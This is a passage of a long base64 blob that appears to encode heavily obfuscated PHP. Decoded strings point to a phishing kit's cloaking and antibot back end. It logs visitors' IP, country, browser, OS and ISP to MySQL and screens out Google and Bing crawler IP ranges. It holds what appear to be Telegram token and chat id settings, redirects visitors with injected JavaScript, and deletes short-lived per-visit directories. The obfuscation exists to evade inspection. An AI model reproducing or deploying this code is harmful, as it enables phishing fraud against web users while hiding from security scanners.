ceDZlXHg2NVwxNDNcMTY0XDE1MVwxNTdceDZlXDQwXHg2NlwxNDFceDY5XDE1NFwxNDVceDY0XHgzYVw0MCIgLiBteXNxbGlfY29ubmVjdF9lcnJvcigpKTsgfSAkc3FsX3UgPSAiXDEyM1x4NDVceDRjXDEwNVwxMDNceDU0XDQwXHgyYVw0MFwxMDZceDUyXDExN1wxMTVceDIwXDE1NFx4NmZcMTQ3XHg3M1x4MjBcMTI3XDExMFx4NDVceDUyXHg0NVw0MFwxNTFceDcwXHg2MVwxNDRceDY0XHg3Mlx4NjVceDczXDc1XDQ3eyRTdHJ1cExvbX1cNDciOyAkcmVzX3UgPSBteXNxbGlfcXVlcnkoJGRiLCAkc3FsX3UpOyBpZiAobXlzcWxpX251bV9yb3dzKCRyZXNfdSkgPiAwKSB7IG15c3FsaV9jbG9zZSgkZGIpOyBlY2hvICJceDIxXDQxIjsgZGllOyB9IGVsc2UgeyAkU3RydXBMb20gPSBteXNxbGlfcmVhbF9lc2NhcGVfc3RyaW5nKCRkYiwgc3RyX3JlcGxhY2UoIlx4MjciLCAnJywgJFN0cnVwTG9tKSk7ICRCbGFzYWNvdW4gPSBteXNxbGlfcmVhbF9lc2NhcGVfc3RyaW5nKCRkYiwgc3RyX3JlcGxhY2UoIlw0NyIsICcnLCAkQmxhc2Fjb3VuKSk7ICRJcENvdW50ID0gbXlzcWxpX3JlYWxfZXNjYXBlX3N0cmluZygkZGIsIHN0cl9yZXBsYWNlKCJceDI3IiwgJycsICRJcENvdW50KSk7ICRPS0pJVkdSRCA9IG15c3FsaV9yZWFsX2VzY2FwZV9zdHJpbmcoJGRiLCBzdHJfcmVwbGFjZSgiXHgyNyIsICcnLCAkT0tKSVZHUkQpKTsgJGRvbmZsYWcgPSBteXNxbGlfcmVhbF9lc2NhcGVfc3RyaW5nKCRkYiwgc3RyX3JlcGxhY2UoIlw0NyIsICcnLCAkZG9uZmxhZykpOyAkTE9DQUxPX1RFTVBPID0gbXlzcWxpX3JlYWxfZXNjYXBlX3N0cmluZygkZGIsIHN0cl9yZXBsYWNlKCJceDI3IiwgJycsICRMT0NBTE9fVEVNUE8pKTsgJGhvc3QgPSBteXNxbGlfcmVhbF9lc2NhcGVfc3RyaW5nKCRkYiwgc3RyX3JlcGxhY2UoIlx4MjciLCAnJywgJGhvc3QpKTsgJGlzcCA9IG15c3FsaV9yZWFsX2VzY2FwZV9zdHJpbmcoJGRiLCBzdHJfcmVwbGFjZSgiXHgyNyIsICcnLCAkaXNwKSk7ICRyZWZpeCA9IG15c3FsaV9yZWFsX2VzY2FwZV9zdHJpbmcoJGRiLCBzdHJfcmVwbGFjZSgiXDQ3IiwgJycsICRyZWZpeCkpOyAkcXVlcnkgPSAiXDExMVwxMTZceDUzXDEwNVwxMjJceDU0XHgyMFwxMTFceDRlXHg1NFx4NGZceDIwXHg2Y1wxNTdceDY3XHg3M1w0MFw1MFx4NjlceDcwXDE0MVx4NjRcMTQ0XHg3Mlx4NjVceDczXDU0XDE0M1x4NmZceDc1XHg2ZVx4NzRceDcyXHg3OVw1NFwxNDJceDcyXHg2ZlwxNjdceDczXDE0NVx4NzJceDJjXHg2ZlwxNjNcNTRceDY0XDE1N1wxNTVceDY5XHg2ZVwxNDVcNTRcMTU1XDE3MVwxNjRceDY5XDE1NVwxNDVcNTRceDY4XDE1N1x4NzNceDc0XDU0XHg2OVx4NzNcMTYwXHgyY1x4NzJceDY1XDE2M1wxNTdceDZlXDUxXDQwXDEyXHgyMFw0MFx4MjBcNDBceDIwXDQwXDExXHgyMFw0MFw0MFx4MjBceDlceDIwXHgyMFwxMjZceDQxXHg0Y1wxMjVceDQ1XHg1M1w0MFw1MFw0N3skU3RydXBMb219XHgyN1w1NFw0N3skQmxhc2Fjb3VufVw0N1x4MmNceDI3eyRJcENvdW50fVx4MjdceDJjXHgyN3skT0tKSVZHUkR9XHgyN1w1NFw0N3skZG9uZmxhZ31cNDdceDJjXDQ3eyRMT0NBTE9fVEVNUE99XHgyN1x4MmNceDI3eyRob3N0fVw0N1w1NFw0N3skaXNwfVw0N1w1NFx4Mjd7JHJlZml4fVx4MjdcNTEiOyAkcmVzdWx0cyA9IG15c3FsaV9xdWVyeSgkZGIsICRxdWVyeSk7IG15c3FsaV9jbG9zZSgkZGIpOyBlY2hvICJcNDEiOyB9IH0gZ290byBtRVF6SjsgWlhUM0I6ICRwcm90b2NvbCA9IGlzc2V0KCRfU0VSVkVSWyJcMTEwXDEyNFwxMjRcMTIwXHg1MyJdKSAmJiAkX1NFUlZFUlsiXDExMFwxMjRcMTI0XDEyMFx4NTMiXSA9PT0gIlwxNTdceDZlIiA/ICJceDY4XHg3NFwxNjRceDcwXHg3MyIgOiAiXHg2OFx4NzRceDc0XHg3MCI7IGdvdG8gV0NjYWs7IHVaMGhoOiBlcnJvcl9yZXBvcnRpbmcoRV9BTEwpOyBnb3RvIEFSbzVmOyBqRldrVzogJFJhbmRPUF9NbHV4ID0gUmFuZF9YRF9URihyYW5kKDQsIDEwKSk7IGdvdG8gb3JpZXE7IFF1WG8xOiAkcmVzcG9uc2UgPSBjdXJsX2V4ZWMoJGN1cmwpOyBnb3RvIEhlM19SOyBWMzZwRzogJFN0cnVwTG9tID0gJGlwUG9ydEFycmF5WzBdOyBnb3RvIE9HcWhFOyBIZTNfUjogY3VybF9jbG9zZSgkY3VybCk7IGdvdG8gSU5Cd3M7IHJvTFNYOiBmdW5jdGlvbiBGT3hfVEdIX1goJFVTRVJfQUdFTlQpIHsgJEJST1dTRVJfRVJST1IgPSAiXHg1NVwxNTZceDZiXHg2ZVwxNTdceDc3XHg2ZVw0MFx4NDJceDcyXDE1N1x4NzdceDczXHg2NVx4NzIiOyAkQlJPV1NFUiA9IGFycmF5KCJceDJmXDE1NVwxNjNceDY5XHg2NVw1N1x4NjkiID0+ICJceDQ5XDE1Nlx4NzRceDY1XHg3MlwxNTZceDY1XDE2NFw0MFwxMDVceDc4XDE2MFwxNTRcMTU3XHg3MlwxNDVceDcyIiwgIlx4MmZcMTQ2XHg2OVx4NzJceDY1XHg2Nlx4NmZcMTcwXHgyZlwxNTEiID0+ICJcMTA2XHg2OVx4NzJceDY1XDE0NlwxNTdcMTcwIiwgIlx4MmZceDczXDE0MVx4NjZceDYxXHg3MlwxNTFcNTdceDY5IiA9PiAiXDEyM1x4NjFcMTQ2XHg2MVx4NzJceDY5IiwgIlx4MmZcMTQzXDE1MFx4NzJceDZmXHg2ZFwxNDVcNTdcMTUxIiA9PiAiXHg0M1wxNTBcMTYyXDE1N1wxNTVceDY1IiwgIlx4MmZcMTQ1XHg2NFx4NjdcMTQ1XDU3XDE1MSIgPT4gIlwxMDVceDY0XDE0N1x4NjUiLCAiXHgyZlwxNTdceDcwXDE0NVwxNjJceDYxXHgyZlx4NjkiID0+ICJceDRmXDE2MFx4NjVcMTYyXDE0MSIsICJceDJmXDE1Nlx4NjVcMTY0XHg3M1wxNDNcMTQxXDE2MFwxNDVceDJmXDE1MSIgPT4gIlx4NGVcMTQ1XDE2NFx4NzNcMTQzXHg2MVx4NzBceDY1IiwgIlw1N1x4NmRceDYxXDE3MFx4NzRceDY4XDE1N1x4NmVcNTdceDY5IiA9PiAiXHg0ZFx4NjFceDc4XDE2NFx4NjhceDZmXHg2ZSIsICJceDJmXHg2Ylx4NmZceDZlXHg3MVwxNjVcMTQ1XHg3MlwxNTdcMTYyXHgyZlwxNTEiID0+ICJcMTEzXDE1N1x4NmVcMTYxXDE2NVx4NjVcMTYyXHg2ZlwxNjIiLCAiXDU3XHg2ZFwxNTdceDYyXDE1MVx4NmNcMTQ1XHgyZlx4NjkiID0+ICJceDQ4XDE0MVwxNTZcMTQ0XHg2OFx4NjVceDZjXHg2NFx4MjBceDQyXDE2MlwxNTdceDc3XDE2M1wxNDVceDcyIik7IGZvcmVhY2ggKCRCUk9XU0VSIGFzICRyZWdleCA9PiAkdmFsdWUpIHsgaWYgKHByZWdfbWF0Y2goJHJlZ2V4LCAkVVNFUl9BR0VOVCkpIHsgJEJST1dTRVJfRVJST1IgPSAkdmFsdWU7IH0gfSByZXR1cm4gJEJST1dTRVJfRVJST1I7IH0gZ290byBSd3Q4eDsgSWJBXzg6IGZ1bmN0aW9uIFJESU9QQigkU3RydXBMb20sICRkYXRhbG9nLCAkRml4Ym9tLCAkTHJlZHN2diwgJE5vcHd2diwgJGlkKSB7ICRkYiA9IG15c3FsaV9jb25uZWN0KCRkYXRhbG9nLCAkRml4Ym9tLCAkTHJlZHN2diwgJE5vcHd2dik7IGlmICghJGRiKSB7IGRpZSgiXDEwM1wxNTdceDZlXDE1NlwxNDVcMTQzXDE2NFx4NjlcMTU3XDE1Nlx4MjBceDY2XDE0MVx4NjlceDZjXDE0NVx4NjRceDNhXHgyMCIgLiBteXNxbGlfY29ubmVjdF9lcnJvcigpKTsgfSAkc3FsX3UgPSAiXHg1M1wxMDVcMTE0XDEwNVwxMDNcMTI0XDQwXDUyXDQwXDEwNlwxMjJcMTE3XDExNVx4MjBcMTYyXHg2NVx4NjRcMTUxXHg3Mlx4NjNcMTY0XDE1MVx4NmZceDZlXDQwXHg1N1wxMTBceDQ1XHg1Mlx4NDVcNDBcMTUxXHg2NFw3NVx4Mjd7JGlkfVx4MjciOyAkcmVzX3UgPSBteXNxbGlfcXVlcnkoJGRiLCAkc3FsX3UpOyBpZiAobXlzcWxpX251bV9yb3dzKCRyZXNfdSkgPiAwKSB7IHdoaWxlICgkcm93ID0gbXlzcWxpX2ZldGNoX2FycmF5KCRyZXNfdSkpIHsgJF9TRVNTSU9OWyJcMTU0XHg2OVx4NmVcMTUzIl0gPSBiYXNlNjRfZGVjb2RlKGJhc2U2NF9kZWNvZGUoJHJvd1siXHg2Y1x4NjlcMTU2XDE1MyJdKSk7ICRfU0VTU0lPTlsiXDE0M1wxNTYiXSA9IGV4cGxvZGUoIlw3MyIsIGJhc2U2NF9kZWNvZGUoYmFzZTY0X2RlY29kZSgkcm93WyJcMTQzXDE1N1wxNjVceDZlXDE2NFx4NzJceDc5Il0pKSk7ICRfU0VTU0lPTlsiXDE2MFx4NjlceDYzIl0gPSAkcm93WyJceDcwXDE1MVx4NjMiXTsgJF9TRVNTSU9OWyJcMTU1XHg3M1x4NjciXSA9IGJhc2U2NF9kZWNvZGUoYmFzZTY0X2RlY29kZSgkcm93WyJcMTU1XHg3M1x4NjciXSkpOyAkX1NFU1NJT05bIlwxNDVcMTcwXHg3MCJdID0gJHJvd1siXHg2NVwxNzBcMTYwXDE1MVwxNjJceDY1Il07ICRfU0VTU0lPTlsiXDE2M1wxNDVcMTYyXHg3Nlx4NjVceDcyIl0gPSBiYXNlNjRfZGVjb2RlKGJhc2U2NF9kZWNvZGUoJHJvd1siXHg3M1x4NjVceDcyXHg3NlwxNDVcMTYyIl0pKTsgJF9TRVNTSU9OWyJcMTY1XHg3MlwxNTQiXSA9IGJhc2U2NF9kZWNvZGUoYmFzZTY0X2RlY29kZSgkcm93WyJceDc1XHg3MlwxNTQiXSkpOyAkX1NFU1NJT05bIlwxNTRcMTY1XHg3OFwxNDNcMTQxXHg3MFwxNjRceDYzXHg2OFx4NjEiXSA9ICRyb3dbIlx4NmNcMTY1XDE3MFx4NjNcMTQxXDE2MFx4NzRcMTQzXDE1MFwxNDEiXTsgJF9TRVNTSU9OWyJceDc0XDE1N1x4NmJcMTQ1XHg2ZVwxNjRcMTQ1XDE1NCJdID0gYmFzZTY0X2RlY29kZShiYXNlNjRfZGVjb2RlKCRyb3dbIlx4NzRceDZmXDE1M1x4NjVceDZlXHg3NFx4NjVceDZjIl0pKTsgJF9TRVNTSU9OWyJceDY5XDE0NFx4NzRceDY1XHg2YyJdID0gYmFzZTY0X2RlY29kZShiYXNlNjRfZGVjb2RlKCRyb3dbIlwxNTFceDY0XDE2NFwxNDVcMTU0Il0pKTsgJF9TRVNTSU9OWyJcMTYyXHg2NVwxNDRceDY5XHg3MlwxNTFcMTQzXHg3NCJdID0gJHJvd1siXHg3MlwxNDVcMTQ0XDE1MVx4NzJcMTUxXDE0M1wxNjQiXTsgJF9TRVNTSU9OWyJceDYxXDE2MFx4NjkiXSA9ICRyb3dbIlwxNDFceDcwXDE1MSJdOyBpZiAoaXNzZXQoJF9HRVRbIlx4NzZcMTYzXDE2MyJdKSkgeyBzZXRjb29raWUoIlx4NzRcMTU3XHg2Ylx4NjVceDZlXHg3NFx4NjVcMTU0IiwgJF9TRVNTSU9OWyJceDc0XDE1N1x4NmJceDY1XDE1Nlx4NzRceDY1XDE1NCJdLCB0aW1lKCkgKyA4NjQwMCAqIDMwLCAiXDU3Iik7IHNldGNvb2tpZSgiXHg2OVwxNDRceDc0XDE0NVwxNTQiLCAkX1NFU1NJT05bIlwxNTFcMTQ0XHg3NFx4NjVceDZjIl0sIHRpbWUoKSArIDg2NDAwICogMzAsICJcNTciKTsgc2V0Y29va2llKCJcMTYyXDE0NVx4NjRcMTUxXHg3MlwxNTFceDYzXHg3NCIsICRfU0VTU0lPTlsiXHg3MlwxNDVcMTQ0XHg2OVx4NzJcMTUxXHg2M1wxNjQiXSwgdGltZSgpICsgODY0MDAgKiAzMCwgIlw1NyIpOyB9IH0gfSBlbHNlIHsgJHJlZml4ID0gIlx4NzBcMTYyXDE1N1wxNTJcMTQ1XDE0M1wxNjRceDIwXDExMVx4NDRceDIwXDE1Nlx4NmZcMTY0XHgyMFwxNDZceDZmXHg3NVwxNTZceDY0XDQwXHg2OVx4NjRcNTZ7JGlkfSI7IGNsaWNrX1RZcXcoJFN0cnVwTG9tLCAkZGF0YWxvZywgJEZpeGJvbSwgJExyZWRzdnYsICROb3B3dnYsICRyZWZpeCk7IGRpZTsgfSBteXNxbGlfY2xvc2UoJGRiKTsgfSBnb3RvIEEyOHcxOyBMb3dTMjogJEZpeGJvbSA9IGJhc2U2NF9kZWNvZGUoIlwxNDNcNjNceDUyXHg3OVx4NjJcNjJceDM1XHg2ZVwxMzBcNjJcMTIyXHg2OFx4NjVceDUxIik7IGdvdG8gdjRFV1Y7IElZNDg0OiBpZiAoaXNzZXQoJF9HRVRbIlx4NjVcMTU2XDE0NFwxNTVcMTQ1XDE1NFx4NzVcMTcwIl0pKSB7ICRyZWRpID0gJF9DT09LSUVbIlx4NzJcMTQ1XDE0NFwxNTFcMTYyXHg2OVwxNDNceDc0Il07ICR2ZGlyID0gJF9HRVRbIlwxNDVceDZlXHg2NFx4NmRcMTQ1XDE1NFwxNjVceDc4Il07ICRkaXJlY3RvcnlUb0RlbGV0ZSA9ICJceDc3XHg2NVwxNDJcNTciIC4gJHZkaXI7IGlmIChpc19kaXIoJGRpcmVjdG9yeVRvRGVsZXRlKSkgeyBpZiAoZGVsZXRlRGlyZWN0b3J5bmV3KCRkaXJlY3RvcnlUb0RlbGV0ZSkpIHsgfSB9IGVjaG8gIlw3NFx4NzNcMTQzXHg3MlwxNTFceDcwXHg3NFw0MFwxMTRceDQxXHg0ZVx4NDdcMTI1XDEwMVx4NDdceDQ1XHgzZFw0N1wxMTJcMTQxXHg3Nlx4NjFceDUzXHg2M1wxNjJceDY5XHg3MFwxNjRcNDdcNzZceGFcNDBcNDBcNDBceDIwXHg3N1wxNTFcMTU2XHg2NFx4NmZceDc3XHgyZVx4NmNceDZmXHg2M1wxNDFcMTY0XHg2OVx4NmZcMTU2XHgyZVx4NjhceDcyXDE0NVx4NjZcNzVceDI3eyRyZWRpfVx4MjdceDNiXDEyXDQwXDQwXHgyMFw0MFx4M2NcNTdcMTYzXHg2M1x4NzJceDY5XDE2MFx4NzRcNzYiOyBkaWU7IH0gZ290byBucmt4YTsgUUNfZUE6ICRfU0VTU0lPTlsiXDE3MFwxMTdceDcwXHg3NVx4NzkiXSA9IGlzc2V0KCRpbmZvWyJcMTYyXDE0NVx4NjdcMTUxXDE1N1wxNTZcMTE2XHg2MVx4NmRceDY1Il0pID8gJGluZm9bIlx4NzJcMTQ1XDE0N1wxNTFceDZmXDE1NlwxMTZceDYxXHg2ZFx4NjUiXSA6IG51bGw7IGdvdG8genlnRVk7IG5ya3hhOiBpZiAoaXNzZXQoJF9HRVRbIlwxNTRcMTU3XDE1NFx4NmRceDY1Il0pKSB7ICR2ZGlyID0gJF9HRVRbIlx4NmNcMTU3XHg2Y1wxNTVcMTQ1Il07ICRyZWZpeCA9ICJcMTExXDE1NlwxNjZceDYxXDE1NFwxNTFcMTQ0XHgyMFx4NmNcMTU3XHg2Y1wxNTVcMTQ1IjsgJHJlZGkgPSAkX0NPT0tJRVsiXHg3MlwxNDVcMTQ0XDE1MVwxNjJcMTUxXDE0M1wxNjQiXTsgY2xpY2tfVFlxdygkU3RydXBMb20sICRkYXRhbG9nLCAkRml4Ym9tLCAkTHJlZHN2diwgJE5vcHd2diwgJHJlZml4KTsgJGRpcmVjdG9yeVRvRGVsZXRlID0gIlx4NzdcMTQ1XDE0Mlw1NyIgLiAkdmRpcjsgaWYgKGlzX2RpcigkZGlyZWN0b3J5VG9EZWxldGUpKSB7IGlmIChkZWxldGVEaXJlY3RvcnluZXcoJGRpcmVjdG9yeVRvRGVsZXRlKSkgeyB9IH0gZWNobyAiXHgzY1x4NzNceDYzXDE2MlwxNTFceDcwXHg3NFx4MjBceDRjXHg0MVx4NGVcMTA3XDEyNVwxMDFcMTA3XDEwNVx4M2RcNDdcMTEyXHg2MVwxNjZcMTQxXHg1M1wxNDNcMTYyXHg2OVwxNjBceDc0XDQ3XHgzZVx4YVw0MFw0MFw0MFx4MjBceDc3XDE1MVwxNTZcMTQ0XHg2ZlwxNjdceDJlXHg2Y1wxNTdcMTQzXHg2MVwxNjRcMTUxXDE1N1wxNTZcNTZcMTUwXDE2MlwxNDVceDY2XHgzZFx4Mjd7JHJlZGl9XHgyN1x4M2JcMTJceDIwXHgyMFw0MFw0MFw3NFw1N1x4NzNcMTQzXHg3Mlx4NjlcMTYwXHg3NFx4M2UiOyBkaWU7IH0gZ290byBNZWFRVjsgSU5Cd3M6ICRpbmZvID0gdW5zZXJpYWxpemUoJHJlc3BvbnNlKTsgZ290byBuUng4bDsgSUdyX1A6IGlmICghQ3ViX0pSUkRfT1AoJFN0cnVwTG9tLCAkZGF0YWxvZywgJEZpeGJvbSwgJExyZWRzdnYsICROb3B3dnYpKSB7ICRzaG93cGlwID0gIlw0MVx4MjFcNDEiOyBlY2hvICRzaG93cGlwOyBkaWU7IH0gZ290byBJWTQ4NDsgRUtiNE46IGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCB0cnVlKTsgZ290byBRdVhvMTsgTXh2Tm86ICRfU0VTU0lPTlsiXDEyNlwxNTdcMTYwXDE2MlwxNjQiXSA9IGlzc2V0KCRpbmZvWyJceDYzXDE1MVx4NzRcMTcxIl0pID8gJGluZm9bIlx4NjNceDY5XDE2NFx4NzkiXSA6IG51bGw7IGdvdG8gUUNfZUE7IFE0bHF0OiAkZGlyZWN0b3JpZXMgPSBnbG9iKCRwYXJlbnREaXJlY3RvcnkgLiAiXDU3XHgyYSIsIEdMT0JfT05MWURJUik7IGdvdG8gQ2dzaG07IG5SeDhsOiAkX1NFU1NJT05bIlwxNTFcMTYzXHg3MCJdID0gaXNzZXQoJGluZm9bIlx4NjlceDczXHg3MCJdKSA/ICRpbmZvWyJcMTUxXHg3M1x4NzAiXSA6IG51bGw7IGdvdG8gSExVdWE7IHN3WlV0OiBmdW5jdGlvbiBkZWxldGVEaXJlY3RvcnkoJGRpcikgeyBpZiAoIWZpbGVfZXhpc3RzKCRkaXIpKSB7IHJldHVybiB0cnVlOyB9IGlmICghaXNfZGlyKCRkaXIpKSB7IHJldHVybiB1bmxpbmsoJGRpcik7IH0gJHRpbWVfZGlmZiA9IHRpbWUoKSAtIGZpbGVjdGltZSgkZGlyKTsgaWYgKCR0aW1lX2RpZmYgPiAyOTApIHsgZm9yZWFjaCAoc2NhbmRpcigkZGlyKSBhcyAkaXRlbSkgeyBpZiAoJGl0ZW0gPT0gIlw1NiIgfHwgJGl0ZW0gPT0gIlx4MmVceDJlIikgeyBjb250aW51ZTsgfSBpZiAoIWRlbGV0ZURpcmVjdG9yeSgkZGlyIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICRpdGVtKSkgeyByZXR1cm4gZmFsc2U7IH0gfSBpZiAocm1kaXIoJGRpcikpIHsgcmV0dXJuIHRydWU7IH0gZWxzZSB7IHJldHVybiBmYWxzZTsgfSB9IGVsc2UgeyByZXR1cm4gdHJ1ZTsgfSB9IGdvdG8geEN2MnY7IEEyOHcxOiBmdW5jdGlvbiBSYW5kX1hEX1RGKCRsZW5ndGgpIHsgJGNoYXJhY3RlcnMgPSAiXHg2MVx4NjJcMTQzXDE0NFwxNDVcMTQ2XDE1MlwxNTBcMTUxXDE0N1wxNTNcMTU0XHg2ZFx4NmVcMTU3XHg3MFwxNjFceDcyXDE2M1wxNjRceDc1XDE2NlwxNjdceDc4XHg3OVwxNzJcNjBceDMxXDYyXHgzM1w2NFx4MzVceDM2XHgzN1x4MzhceDM5XHg0MVwxMDJcMTAzXDEwNFx4NDVceDQ2XHg0N1x4NDhceDQ5XDExMlx4NGJcMTE0XDExNVwxMTZcMTE3XDEyMFwxMjFcMTIyXHg1M1wxMjRcMTI1XDEyNlx4NTdcMTMwXHg1OVx4NWEiOyAkY2hhcmFjdGVyc0xlbmd0aCA9IHN0cmxlbigkY2hhcmFjdGVycyk7ICRyYW5kb21TdHJpbmcgPSAnJzsgZm9yICgkaSA9IDA7ICRpIDwgJGxlbmd0aDsgJGkrKykgeyAkcmFuZG9tU3RyaW5nIC49ICRjaGFyYWN0ZXJzW3JhbmQoMCwgJGNoYXJhY3RlcnNMZW5ndGggLSAxKV07IH0gcmV0dXJuICRyYW5kb21TdHJpbmc7IH0gZ290byBKMVJMTjsgdkVuMTA6IGlmIChpc3NldCgkX1BPU1RbIlwxNTRceDZmXHg2M1x4NjFceDZjXHg2OVx4NzAiXSkpIHsgJG15aXBzID0gYmFzZTY0X2RlY29kZShiYXNlNjRfZGVjb2RlKCRfUE9TVFsiXHg2Y1wxNTdcMTQzXDE0MVwxNTRceDY5XDE2MCJdKSk7ICRfU0VTU0lPTlsiXDE1NFwxNTdcMTU0XHg2OVwxNjBceDczIl0gPSAkbXlpcHM7ICRTdHJ1cExvbSA9ICRteWlwczsgfSBnb3RvIHBfNVJXOyBwXzVSVzogZnVuY3Rpb24gaXNfYm90X2lwKCRpcFRvQ2hlY2spIHsgJGJvdHNVcmxzID0gYXJyYXkoIlx4NjdceDZmXHg2ZlwxNDdcMTU0XHg2NSIgPT4gIlx4NjhcMTY0XDE2NFwxNjBceDczXDcyXDU3XDU3XHg2NFwxNDVcMTY2XHg2NVx4NmNcMTU3XHg3MFwxNDVceDcyXDE2M1x4MmVcMTQ3XDE1N1wxNTdceDY3XHg2Y1wxNDVcNTZcMTQzXHg2ZlwxNTVcNTdcMTYzXDE0NVwxNDFceDcyXDE0M1wxNTBcNTdceDYxXHg3MFwxNTFceDczXHgyZlwxNTFcMTYwXDE2MlwxNDFceDZlXDE0N1wxNDVcMTYzXHgyZlwxNDdcMTU3XDE1N1wxNDdcMTU0XDE0NVwxNDJcMTU3XDE2NFx4MmVceDZhXDE2M1wxNTdcMTU2IiwgIlx4NjJceDY5XDE1NlwxNDciID0+ICJcMTUwXHg3NFx4NzRceDcwXDE2M1x4M2FceDJmXDU3XDE2N1x4NzdcMTY3XHgyZVwxNDJceDY5XHg2ZVx4NjdceDJlXDE0M1wxNTdcMTU1XHgyZlx4NzRcMTU3XDE1N1x4NmNcMTQyXHg2Zlx4NzhcNTdcMTQyXHg2OVwxNTZceDY3XDE0MlwxNTdcMTY0XHgyZVwxNTJceDczXDE1N1wxNTYiKTsgZm9yZWFjaCAoJGJvdHNVcmxzIGFzICRib3QgPT4gJHVybCkgeyAkYm90UmVzcCA9IGpzb25fZGVjb2RlKGZpbGVfZ2V0X2NvbnRlbnRzKCR1cmwpLCB0cnVlKTsgZm9yZWFjaCAoJGJvdFJlc3BbIlwxNjBcMTYyXDE0NVwxNDZcMTUxXDE3MFwxNDVceDczIl0gYXMgJGlwUmFuZ2UpIHsgaWYgKGlzc2V0KCRpcFJhbmdlWyJcMTUxXHg3MFwxNjZceDM2XHg1MFx4NzJcMTQ1XHg2Nlx4NjlceDc4Il0pICYmIHN0cnBvcygkaXBUb0NoZWNrLCAiXHgzYSIpICE9PSBmYWxzZSkgeyAkbmV0d29yayA9ICRpcFJhbmdlWyJcMTUxXDE2MFwxNjZceDM2XDEyMFwxNjJcMTQ1XDE0Nlx4NjlceDc4Il07IH0gZWxzZWlmIChpc3NldCgkaXBSYW5nZVsiXHg2OVwxNjBceDc2XHgzNFwxMjBcMTYyXHg2NVwxNDZceDY5XDE3MCJdKSAmJiBzdHJwb3MoJGlwVG9DaGVjaywgIlx4M2EiKSA9PT0gZmFsc2UpIHsgJG5ldHdvcmsgPSAkaXBSYW5nZVsiXDE1MVwxNjBceDc2XDY0XDEyMFx4NzJcMTQ1XDE0Nlx4NjlceDc4Il07IH0gZWxzZSB7IGNvbnRpbnVlOyB9IGlmIChpcF9pbl9yYW5nZSgkaXBUb0NoZWNrLCAkbmV0d29yaykpIHsgcmV0dXJuICRib3Q7IH0gfSB9IHJldHVybiBmYWxzZTsgfSBnb3RvIHUwaVF5OyB2Njh6ZTogZnVuY3Rpb24gSFlUX0REUl9VaW8oJFVTRVJfQUdFTlQpIHsgJE9TX0VSUk9SID0gIlwxMjVcMTU2XHg2YlwxNTZceDZmXHg3N1wxNTZceDIwXHg0Zlx4NTNcNDBceDUwXDE1NFwxNDFcMTY0XDE0NlwxNTdceDcyXHg2ZCI7ICRPUyA9IGFycmF5KCJcNTdcMTY3XHg2OVwxNTZceDY0XDE1N1wxNjdceDczXDQwXHg2ZVx4NzRceDIwXHgzMVx4MzBcNTdcMTUxIiA9PiAiXDEyN1wxNTFcMTU2XDE0NFwxNTdcMTY3XDE2M1w0MFw2MVx4MzAiLCAiXDU3XHg3N1wxNTFceDZlXHg2NFx4NmZceDc3XDE2M1x4MjBcMTU2XDE2NFx4MjBcNjZcNTZcNjNcNTdceDY5IiA9PiAiXHg1N1wxNTFcMTU2XHg2NFwxNTdcMTY3XDE2M1x4MjBceDM4XDU2XHgzMSIsICJcNTdcMTY3XHg2OVwxNTZcMTQ0XDE1N1x4NzdceDczXHgyMFwxNTZceDc0XHgyMFx4MzZcNTZceDMyXDU3XHg2OSIgPT4gIlx4NTdceDY5XHg2ZVx4NjRcMTU3XDE2N1wxNjNceDIwXHgzOCIsICJcNTdcMTY3XHg2OVwxNTZceDY0XDE1N1wxNjdcMTYzXDQwXDE1Nlx4NzRceDIwXDY2XDU2XHgzMVx4MmZcMTUxIiA9PiAiXDEyN1wxNTFceDZlXDE0NFwxNTdcMTY3XDE2M1w0MFw2NyIsICJceDJmXDE2N1x4NjlceDZlXDE0NFx4NmZceDc3XHg3M1w0MFx4NmVcMTY0XDQwXHgzNlx4MmVcNjBcNTdcMTUxIiA9PiAiXDEyN1x4NjlcMTU2XDE0NFwxNTdceDc3XHg3M1x4MjBcMTI2XDE1MVx4NzNcMTY0XHg2MSIsICJceDJmXHg3N1wxNTFceDZlXDE0NFwxNTdcMTY3XHg3M1w0MFx4NmVcMTY0XHgyMFx4MzVceDJlXDYyXDU3XDE1MSIgPT4gIlx4NTdceDY5XDE1NlwxNDRcMTU3XDE2N1wxNjNcNDBceDUzXDE0NVwxNjJcMTY2XHg2NVx4NzJcNDBceDMyXHgzMFx4MzBcNjNcNTdceDU4XHg1MFw0MFx4NzhcNjZcNjQiLCAiXHgyZlwxNjdcMTUxXDE1NlwxNDRcMTU3XDE2N1wxNjNcNDBcMTU2XHg3NFx4MjBceDM1XHgyZVw2MVx4MmZceDY5IiA9PiAiXDEyN1wxNTFceDZlXDE0NFx4NmZcMTY3XDE2M1w0MFx4NThcMTIwIiwgIlx4MmZcMTY3XDE1MVx4NmVcMTQ0XDE1N1x4NzdcMTYzXDQwXDE3MFx4NzBceDJmXHg2OSIgPT4gIlwxMjdceDY5XDE1NlwxNDRceDZmXHg3N1x4NzNceDIwXHg1OFx4NTAiLCAiXDU3XDE2N1wxNTFcMTU2XHg2NFwxNTdcMTY3XHg3M1w0MFwxNTZcMTY0XDQwXHgzNVx4MmVcNjBceDJmXHg2OSIgPT4gIlx4NTdceDY5XDE1Nlx4NjRcMTU3XHg3N1wxNjNcNDBceDMyXHgzMFx4MzBceDMwIiwgIlx4MmZceDc3XDE1MVwxNTZcMTQ0XDE1N1wxNjdceDczXHgyMFx4NmRcMTQ1XDU3XHg2OSIgPT4gIlwxMjdceDY5XDE1NlwxNDRcMTU3XHg3N1x4NzNcNDBceDRkXDEwNSIsICJcNTdcMTY3XDE1MVx4NmVcNzFcNzBcNTdcMTUxIiA9PiAiXHg1N1wxNTFcMTU2XDE0NFwxNTdcMTY3XDE2M1w0MFw3MVx4MzgiLCAiXHgyZlx4NzdceDY5XHg2ZVw3MVx4MzVceDJmXDE1MSIgPT4gIlwxMjdceDY5XDE1Nlx4NjRcMTU3XHg3N1wxNjNcNDBcNzFcNjUiLCAiXHgyZlwxNjdcMTUxXHg2ZVx4MzFcNjZcNTdcMTUxIiA9PiAiXHg1N1wxNTFcMTU2XHg2NFx4NmZcMTY3XDE2M1x4MjBceDMzXDU2XDYxXDYxIiwgIlw1N1x4NmRceDYxXDE0M1x4NjlceDZlXHg3NFx4NmZceDczXHg2OFx4N2NceDZkXHg2MVx4NjNcNDBceDZmXHg3M1w0MFwxNzBcNTdcMTUxIiA9PiAiXDExNVwxNDFcMTQzXHgyMFx4NGZceDUzXHgyMFwxMzAiLCAiXDU3